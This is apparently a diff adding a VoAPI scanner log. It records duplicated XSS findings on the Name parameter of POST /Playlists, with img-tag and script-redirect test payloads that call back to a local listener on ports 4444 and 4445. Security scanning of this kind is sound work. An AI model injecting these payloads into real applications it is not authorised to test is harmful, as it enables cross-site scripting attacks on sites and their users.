@@ -1,0 +1,39 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsVoAPIName'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsVoAPIName'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsVoAPIName'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsVoAPIName'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsVoAPIName'</script>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsVoAPIName'</script>
+
